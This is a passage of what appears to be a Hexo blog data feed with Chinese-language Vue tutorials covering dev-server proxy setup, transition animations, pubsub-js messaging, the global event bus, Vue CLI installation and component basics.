proxy: &#x27;http://localhost:5000&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>配置简单，请求资源时直接转发前端8080即可</p><p>不能配置多个代理不能灵活控制请求是否走代理</p><p>如果按上面配置的话，当请求了前端不存在资源时，那么该请求会转发给服务器(优先匹配前端的资源)</p></blockquote></li><li><p>在axios发请求中替换成代理服务器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getStundetName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    axios.get(<span class="string">&#x27;http://localhost:8080/students&#x27;</span>).then(</span><br><span class="line">        <span class="function"><span class="params">response</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;请求成功&#x27;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="params">error</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;请求失败&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>再次发送请求</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202271706851.png"></p><blockquote><p>注意</p><p>当本地有同样的资源时将不会转发到对应服务器获取资源，也就是说在工程中public文件下有的资源将不会进行转发</p></blockquote><h1 id="开启代理的方式二"><a href="#开启代理的方式二" class="headerlink" title="开启代理的方式二"></a>开启代理的方式二</h1><blockquote><p>解决上面代理方式一的问题</p></blockquote><p>根据官网的配置项</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    proxy: &#123;</span><br><span class="line">      <span class="string">&#x27;/api&#x27;</span>: &#123; // 请求的前缀</span><br><span class="line">        target: <span class="string">&#x27;&lt;url&gt;&#x27;</span>,</span><br><span class="line">         ws: true, // 用于支持websocket</span><br><span class="line">         changeOrigin: true // true用真实端口访问， false用于对方服务器的端口访问端口</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;/foo&#x27;</span>: &#123;</span><br><span class="line">        target: <span class="string">&#x27;&lt;other_url&gt;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在axios请求中加上前缀</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getStundetName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    axios.get(<span class="string">&#x27;http://localhost:8080/studentApi/students&#x27;</span>).then(</span><br><span class="line">        <span class="function"><span class="params">response</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;请求成功&#x27;</span>, response.data);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="params">error</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;请求失败&#x27;</span>, error.message);</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后会报一个请求路径错误原因是因为把<code>studentApi</code>带进去了</p><p><code>解决方法:</code></p><p>需要写一个配置项</p><p><code>pathRewrite:&#123;&#39;^/studentApi&#39;:&#39;&#39;&#125;</code></p><p>示例:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;/studentApi&#x27;</span>: &#123; <span class="comment">// 请求的前缀</span></span><br><span class="line">            <span class="attr">target</span>: <span class="string">&#x27;http://localhost:5000&#x27;</span>,</span><br><span class="line">                <span class="attr">pathRewrite</span>:&#123;<span class="string">&#x27;^/studentApi&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;,</span><br><span class="line">                    <span class="attr">ws</span>: <span class="literal">true</span>, <span class="comment">// 用于支持websocket</span></span><br><span class="line">                        <span class="attr">changeOrigin</span>: <span class="literal">true</span> <span class="comment">// true跟对方服务器用真实端口访问， false用于对方服务器的端口访问端口</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue动画</title>
      <link href="/2022/02/27/Vue%E5%8A%A8%E7%94%BB/"/>
      <url>/2022/02/27/Vue%E5%8A%A8%E7%94%BB/</url>
      
        <content type="html"><![CDATA[<center> <h1>Vue动画</h1></center><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在插入、更新或者移除DOM元素时，在合适的地方添加样式类名</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202271554242.png"></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ol><li>准备好样式<ul><li>元素进入的样式<ol><li>v-enter : 进入的起点</li><li>v-enter-active : 进入过程中</li><li>v-enter-to : 进入的终点</li></ol></li><li>元素离开的样式<ol><li>v-leave : 离开的起点</li><li>v-leave-active : 离开的过程</li><li>v-leave-to : 离开的终点</li></ol></li></ul></li><li>使用<code>&lt;transition&gt;</code>包裹要过渡的元素，并配置name属性</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&#x27;hello&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&#x27;isShow&#x27;</span>&gt;</span> 你好世界<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>注意:</code>如果有多个元素需要过滤, 则需要使用<code>&lt;transition-group&gt;</code>, 且每一个元素都要指定key值</p><p>自定义动画样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.todo-enter-active</span>&#123;</span><br><span class="line">  <span class="attribute">animation</span>: todo-aminner <span class="number">0.5s</span> linear;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.todo-leave-active</span>&#123;</span><br><span class="line">    <span class="attribute">animation</span>: todo-aminner <span class="number">0.5s</span> linear reverse;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> todo-aminner&#123;</span><br><span class="line">  <span class="selector-tag">from</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">100%</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用样式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">name</span>=<span class="string">&quot;todo&quot;</span> <span class="attr">appear</span>&gt;</span>      </span><br><span class="line">    <span class="tag">&lt;<span class="name">MyItem</span> <span class="attr">v-for</span>=<span class="string">&quot;todo in todos&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;todo.id&quot;</span> <span class="attr">:todoObg</span>=<span class="string">&quot;todo&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue消息订阅</title>
      <link href="/2022/02/27/Vue%E6%B6%88%E6%81%AF%E8%AE%A2%E9%98%85/"/>
      <url>/2022/02/27/Vue%E6%B6%88%E6%81%AF%E8%AE%A2%E9%98%85/</url>
      
        <content type="html"><![CDATA[<center> <h1>Vue消息订阅</h1></center><h1 id="消息订阅与发布"><a href="#消息订阅与发布" class="headerlink" title="消息订阅与发布"></a>消息订阅与发布</h1><ol><li>订阅消息</li><li>发布消息</li></ol><p>哪个组件需要消息就在哪个组件中订阅消息</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>引入一个外置的库<code>pubsub.js</code> 它可以实现消息的订阅与发布</p><p>安装方式:</p><p><code>npm install pubsub-js</code></p><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>在订阅的组件中引用pubsub-js</p><p><code>import pubsub from &#39;pubsub-js&#39;</code></p><h2 id="订阅消息"><a href="#订阅消息" class="headerlink" title="订阅消息"></a>订阅消息</h2><p>在方法内部调用subscribe(消息名, 回调)方法</p><blockquote><p>回调有两个参数第一个是方法名，第二个才是回调的数据</p></blockquote><p><code>pubsub.subscribe(&#39;hello&#39;, function(func,data)&#123;函数体&#125;)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 订阅消息</span></span><br><span class="line">pubsub.subscribe(<span class="string">&#x27;hello&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">func,data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;有人发布了hello消息, hello消息回调执行了&#x27;</span>, <span class="string">&#x27;方法名是:&#x27;</span>,func,<span class="string">&#x27;信息是&#x27;</span>,data);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="发布消息"><a href="#发布消息" class="headerlink" title="发布消息"></a>发布消息</h2><p>1、在收取订阅信息的组件中先引入pubsub-js</p><p><code>import pubsub from &#39;pubsub-js&#39;</code></p><p>2、收取信息</p><p>在方法中调用publish(‘订阅名’, 回调)</p><p><code>pubsub.publish(&#39;hello&#39;, 数据体)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="title">getStundetName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="comment">//    this.$bus.$emit(&#x27;hello&#x27;, this.name)</span></span><br><span class="line">     <span class="comment">//  收取订阅消息</span></span><br><span class="line">     pubsub.publish(<span class="string">&#x27;hello&#x27;</span>, <span class="number">66</span>)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>浏览器控制台输出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有人发布了hello消息, hello消息回调执行了 方法名是: hello 信息是 66</span><br></pre></td></tr></table></figure><h2 id="销毁消息"><a href="#销毁消息" class="headerlink" title="销毁消息"></a>销毁消息</h2><p>当组件要被销毁的时候需要取消订阅</p><p>在销毁钩子的内容写销毁消息</p><p>需要拿到订阅消息的返回值id才能进行销毁</p><p>1、获取订阅消息返回id</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 订阅消息</span></span><br><span class="line">             <span class="built_in">this</span>.pubId = pubsub.subscribe(<span class="string">&#x27;hello&#x27;</span>, <span class="function">(<span class="params">func,data</span>)=&gt;</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;有人发布了hello消息, hello消息回调执行了&#x27;</span>, <span class="string">&#x27;方法名是:&#x27;</span>,func,<span class="string">&#x27;信息是&#x27;</span>,data);</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure><p>2、使用返回id值销毁此消息的订阅</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    pubsub.unsubscribe(<span class="built_in">this</span>.pubId)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>此时的this指向会有问题需要写成函数箭头方式将this重新指向vc</p><p>或者在方法区定义方法然后再进行调用</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue事件总线</title>
      <link href="/2022/02/25/Vue%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF/"/>
      <url>/2022/02/25/Vue%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<center> <h1>Vue事件总线</h1></center><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>全局事件组件任意可通信</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装全局事件总线</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Vue.prototype.$bus = <span class="built_in">this</span> <span class="comment">//安装全局总线</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">render</span> : <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>将<code> Vue.prototype.$bus</code>设置为中间人, 让所以组件的事件都绑定到这个vc身上, 这样所有的组件都能看到这个组件, 并拥有$emit、$off、$one 等属性</p></blockquote><h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p>接收数据: A组件想接收数据，则在A组件中给$bus绑定自定义事件, 事件的回调要留在A组件自身</p><p>举例:</p><blockquote><p>有两个组件, 第一个组件叫my-School另外一个组件叫Student，my-School组件想接收Student属性的name值可以这样做</p></blockquote><p>​    1、在my-School组件mounted是生命周期函数中绑定一个事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span> <span class="attr">ref</span>=<span class="string">&quot;title&quot;</span>&gt;</span>学校名称: &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址: &#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">name</span>:<span class="string">&#x27;my-School&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">name</span>: <span class="string">&#x27;幼儿园&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">address</span>: <span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$bus.$on(<span class="string">&#x27;hello&#x27;</span>, <span class="function">(<span class="params">data</span>)=&gt;</span>&#123;<span class="comment">// 绑定自定义事件</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;我是shcool组件我收到数据&#x27;</span>,data);</span></span><br><span class="line"><span class="javascript">            &#125;)</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    2、在Student组件创建一个函数使用$emit函数执行自定义事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生姓名: &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生性别: &#123;&#123;sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getStundetName&quot;</span>&gt;</span>把名字给Schoool组件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">name</span>:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                   <span class="attr">name</span>:<span class="string">&#x27;可可&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                   <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span></span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">getStundetName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">               <span class="built_in">this</span>.$bus.$emit(<span class="string">&#x27;hello&#x27;</span>, <span class="built_in">this</span>.name)<span class="comment">// 执行函数</span></span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;less&quot;</span> <span class="attr">scope</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202251609624.png"></p><hr><p>最好在beforeDestroy钩子中用<code>$off</code>去解绑当前组件所用到的事件</p><p>这样就可以实现兄弟组件的信息传递，前提得先安装事件总线</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue脚手架</title>
      <link href="/2022/02/23/Vue%E8%84%9A%E6%89%8B%E6%9E%B6/"/>
      <url>/2022/02/23/Vue%E8%84%9A%E6%89%8B%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<center> <h1>Vue脚手架</h1></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Vue脚手架时Vue官方提供标准化开发工具</p><h2 id="1-vue脚手架是什么？"><a href="#1-vue脚手架是什么？" class="headerlink" title="1. vue脚手架是什么？"></a>1. vue脚手架是什么？</h2><ol><li><ol><li>它是一个专门为单页面（SPA）应用快速搭建繁杂的脚手架，它是基于webpack的基础开发出来的一款能够快速的帮助我们构建一个用来开发vue的项目目录、结构（vue和webpack的项目模板）。</li><li>vue脚手架通常使用在大型项目中，能够加快我们的开发速度。而小型项目不推荐使用脚手架，因为反而</li></ol></li></ol><p>会拖慢我们项目的开发速度</p><h2 id="2-为什么会有vue脚手架？"><a href="#2-为什么会有vue脚手架？" class="headerlink" title="2. 为什么会有vue脚手架？"></a>2. 为什么会有vue脚手架？</h2><ol><li><ol><li>因为 webpack 配置繁琐, 阻止一批想用 vue 但是不会 webpack 的开发人员,所以作者直接将所有 vue 项目中用到的配置全部帮你写好了,这样,就不需要开发人员再去配置基础 webpack 配置项了</li><li>也就是说,使用 vue-cli 这个脚手架工具后,再也不用担心 webpack 配置问题了, 我们前端只需要写 vue 代码, 来实现功能即可</li></ol></li></ol><h2 id="3-vue文件是什么？"><a href="#3-vue文件是什么？" class="headerlink" title="3. .vue文件是什么？"></a>3. .vue文件是什么？</h2><ol><li><ol><li><p>.vue文件是单文件组件</p></li><li><ol><li>什么是单文件组件 ? 后缀为 .vue 的文件</li><li>单文件组件的三个组成部分 (代码块 : scaffold 自动提示)</li></ol></li></ol></li></ol><ul><li>template (模板结构)</li><li>script 组件的代码逻辑</li><li>style 样式</li></ul><p>Tips：</p><p>单文件组件,无法直接在浏览器中使用,必须经过 webpack 这种打包工具,处理后,才能在浏览器中使用</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>使用npm安装</p><ul><li>第一步：（仅执行一次）</li><li><code>npm install -g @vue/cli</code></li><li>第二步: （切换到你创建项目的目录. 然后使用命令创建项目）</li><li><code>vue create xxx</code></li><li>第三步: （启动项目）</li><li>npm run serve</li></ul><p>卸载脚手架</p><p><code>npm uninstall vue-cli</code></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue组件</title>
      <link href="/2022/02/23/Vue%E7%BB%84%E4%BB%B6/"/>
      <url>/2022/02/23/Vue%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<center> <h1>Vue组件</h1></center><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>组件是实现应用中<code>局部</code>功能<code>代码</code>和<code>资源</code>的<code>集合</code></p><p>组件可以嵌套</p><p>好处</p><ol><li>复用编码</li><li>简化项目编码</li><li>提高运行效率</li></ol><p>当应用中的功能都是很多组件方式来编写那这个应用就是一个组件化的应用</p><p>组件结构</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202231302037.png"></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>向外提供特定功能的js程序，一般就是一个js文件</p><p>js文件很多很复杂</p><p>好处</p><ol><li>复用js</li><li>简化js的编写</li><li>提高js运行效率</li></ol><p>当应用中的js都以模块化来编写那这个应用就是一个模块化的应用</p><h1 id="传统方式编写VSVue框架编写"><a href="#传统方式编写VSVue框架编写" class="headerlink" title="传统方式编写VSVue框架编写"></a>传统方式编写VSVue框架编写</h1><h2 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h2><p>图例</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202231252475.png"></p><h2 id="框架方式"><a href="#框架方式" class="headerlink" title="框架方式"></a>框架方式</h2><p>文件好维护</p><p>代码复用率高</p><p>图例<img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202202231300058.png"></p><h1 id="创建组件"><a href="#创建组件" class="headerlink" title="创建组件"></a>创建组件</h1><h2 id="非文件组件"><a href="#非文件组件" class="headerlink" title="非文件组件"></a>非文件组件</h2><blockquote><p>一个文件包含有n个组件</p></blockquote><h3 id="第一步创建组件"><a href="#第一步创建组件" class="headerlink" title="第一步创建组件"></a>第一步创建组件</h3><p>需要写Vue中的extend({})方法</p><p>注意</p><ul><li><p>组件定义不需要写el配置项，因为它最终所有组件都要被一个vm管理，由vm调用</p></li><li><p>在组件中data配置需要写成函数 避免组件被重复使用时数据存在引用关系(<code>也需要写出普通函数, 不要写成箭头函数</code>)</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> school = Vue.extend(&#123;</span><br><span class="line">            <span class="comment">// el:&#x27;#rooot&#x27; 组件定义不需要写el配置项，因为它最终所有组件都要被一个vm管理，由vm调用</span></span><br><span class="line">            <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;    <span class="comment">// 在组件中data配置需要写成函数 才能防止不同代码调用的是新的对象</span></span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">schoolName</span>: <span class="string">&quot;理工&quot;</span>,</span><br><span class="line">                    <span class="attr">address</span>: <span 